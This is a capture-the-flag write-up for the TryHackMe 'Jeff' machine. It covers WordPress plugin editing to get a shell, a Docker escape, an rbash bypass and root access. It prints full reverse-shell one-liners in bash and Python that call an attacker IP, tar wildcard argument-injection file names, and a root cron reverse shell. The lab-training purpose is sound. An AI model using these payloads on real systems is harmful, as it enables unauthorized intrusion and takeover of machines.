Hack the machine and obtain the user.txt flag.
Hint: Add jeff.thm to your /etc/hosts file.

Services enumeration
Let’s start by scanning the machine with Nmap. There are 2 open ports:

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)

80/tcp open  http    nginx
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
As mentioned in the hint, let’s add jeff.thm in our /etc/hosts file:

$ echo "10.10.144.133 jeff.thm" | sudo tee -a /etc/hosts
Web enumeration
Hidden locations
There is no robots.txt file but gobuster discovers several interesting hidden directories (admin, backups and uploads):

However, browsing /admin/login.php forces the download of the file, which is empty. Likely a rabbit hole.

uploads
The /uploads directory contains an index.html with a form to upload files on the server. However, there is no action tag in the form, nor any javascript included. Further enumerating the directory doesn’t reveal any other hidden source. This is another rabbit hole.

backups
The /backups/ directory doesn’t allow directory listing, but gobuster found a backup.zip file:

John found the password to uncompress the archive: !!Burningbird!!. The wpadmin.bak file reveals the Wordpress password.

$ cat wpadmin.bak 
wordpress password is: phO#g)C5dhIWZn3BKP
Question: Is there any Wordpress installation somewhere? Maybe a virtual host?

Another vhost?

wpscan revealed a user: jeff. And we already have the password (remember the backup archive?). Let’s connect: http://wordpress.jeff.thm/wp-login.php

Reverse shell
Now connected as jeff (who is admin BTW), we should be able to get a reverse shell.

Unfortunately, we can’t modify the 404.php template from the “Theme Editor” because of the following error:

Something went wrong. Your change may not have been saved. Please try again. There is also a chance that you may need to manually fix and upload the file over FTP.
Let’s try with the plugins. Go to “Plugins > PluginEditor” from the menu. From the dropdown on the right hand side, select “Hello Dolly” and click on the “Select” button. It will show the code for the hello.php template. Append the following content to the file and click on the “Update file” button.

exec("/bin/bash -c 'bash -i >& /dev/tcp/10.8.50.72/4444 0>&1'");
Now, open a listener (rlwrap nc -nlvp 4444) and activate the plugin (“Plugins > Installed plugins”).

We now have a reverse shell.

Docker evasion
It turns out that we land in a docker container, what is confirmed by leanpeas.sh.

After trying to evade docker and failing due to a lack of permission to execute docker, I decided to exploit something else.

There is an interesting ftp_backup.php script under /var/www/html/:

<?php
/* 
    Todo: I need to finish coding this database backup script.
    also maybe convert it to a wordpress plugin in the future.
*/
$dbFile = 'db_backup/backup.sql';
$ftpFile = 'backup.sql';

$username = "backupmgr";
$password = "SuperS1ckP4ssw0rd123!";

$ftp = ftp_connect("172.20.0.1"); // todo, set up /etc/hosts for the container host

if( ! ftp_login($ftp, $username, $password) ){
    die("FTP Login failed.");
}

$msg = "Upload failed";
if (ftp_put($ftp, $remote_file, $file, FTP_ASCII)) {
    $msg = "$file was uploaded.\n";
}

echo $msg;
ftp_close($conn_id);
Running it will display the error message “Upload failed”, which is a sign that the authentication was successful. Unfortunately, ftp, nc or telnet are not available in the container and we have to use curl (make sure you use the -P - flag to force the active mode).

Crontab?
This is where I was left without ideas, and after a while, I decided to have a quick look at the writeups to see how I could move forward. I could read that “a crontab is running outside the container! The user backupmgr is running tar every minute and uses a wildcard * to include everything in the ftp://files directory”.

Honestly, without any hint (did I miss any?), I don’t know how one could do this kind of assumption, but let’s take it for granted… I stopped reading the write-up and decided to continue exploring myself, with this new “hint”.

Reverse shell (escape the docker container)
Long story short, what we need to do is to push 3 files on the ftp server, under the /files directory in order to inject parameters to the tar command, as described on GTFOBins:

shell: a new reverse shell (we will do it in python)
--checkpoint=1
--checkpoint-action=exec=sh shell: to run our shell
Let’s create the files:

$ echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.8.50.72\",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'" > shell.sh
$ echo "" > "/var/www/html/--checkpoint=1"
$ echo "" > "/var/www/html/--checkpoint-action=exec=sh shell.sh"
And now, let’s upload them to the remote location:

$ curl -v -P - -T "/var/www/html/shell.sh" 'ftp://backupmgr:SuperS1ckP4ssw0rd123!@172.20.0.1/files/'
$ curl -v -P - -T "/var/www/html/--checkpoint=1" 'ftp://backupmgr:SuperS1ckP4ssw0rd123!@172.20.0.1/files/'
$ curl -v -P - -T "/var/www/html/--checkpoint-action=exec=sh shell.sh" 'ftp://backupmgr:SuperS1ckP4ssw0rd123!@172.20.0.1/files/'
Open a new listener and wait 1 minute to get a new shell as backupmgr, outside of the docker container.

$ rlwrap nc -nlvp 5555

Let’s immediatly upgrade our shell:

Listing files owned by jeff reveals 2 interesting files:

cat /var/backups/jeff.bak
cat: /var/backups/jeff.bak: Permission denied
Reading jeff.bak would obviously help (likely containing information to switch to the user), but only jeff can read the file. On the other hand, running the systool executable will show a menu:

We now have jeff’s password and we can connect via SSH. Unfortunately, there is another complexity, we are in a restricted bash (rbash) environment, that prevents us from reading the user flag:

kali@kali:/data/Jeff/files$ ssh jeff@jeff.thm
jeff@tryharder:~$ cat user.txt
-rbash: /usr/lib/command-not-found: restricted: cannot specify `/' in command names
Evade the restricted shell (rbash)
After some research on the Internet, I eventually found that appending -t "bash -l" to the SSH connection string allows to bypass the restricted bash.

kali@kali:/data/Jeff/files$ ssh jeff@jeff.thm -t "bash -l"
Warning: Permanently added the ECDSA host key for IP address '10.10.144.133' to the list of known hosts.

After manually defining some paths in the PATH environment variable, I was able to eventually read the user flag.

jeff@tryharder:~$ cat user.txt
Command 'cat' is available in '/bin/cat'
The command could not be located because '/bin' is not included in the PATH environment variable.
cat: command not found
jeff@tryharder:~$ echo $PATH
/home/jeff/.bin
jeff@tryharder:~$ export PATH=/bin:/usr/bin:/usr/sbin:/usr/local/bin
jeff@tryharder:~$ echo $PATH
/bin:/usr/bin:/usr/sbin:/usr/local/bin
jeff@tryharder:~$ cat user.txt
THM{Has*****rls}
I tried to validate the user flag but it failed.

User flag
The flag seems to be hashed (Has*****Girls) with MD5:

jeff@tryharder:~$ echo -n "Hash*****Girls" | md5sum
e12*****cac  -
User flag: THM{e12*****cac}

Escalate your privileges, whats the root flag?
Jeff’s privileges
After so many difficulties to get the user flag, I was not expecting anything from the sudo -l command, but was surprised to see that jeff was allowed to run crontab as root without password.

jeff@tryharder:~$ sudo -l
[sudo] password for jeff: 
Matching Defaults entries for jeff on tryharder:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jeff may run the following commands on tryharder:
    (ALL) /usr/bin/crontab
Crontab
Let’s edit the crontab with sudo crontab -e and add the following line:

* * * * * python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.50.72",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
Now, open a listener and wait 1 minute to get a root shell:

kali@kali:/data/vpn$ rlwrap nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.8.50.72] from (UNKNOWN) [10.10.144.133] 44900

And access the root flag:

root@tryharder:~# cat root.txt
cat root.txt
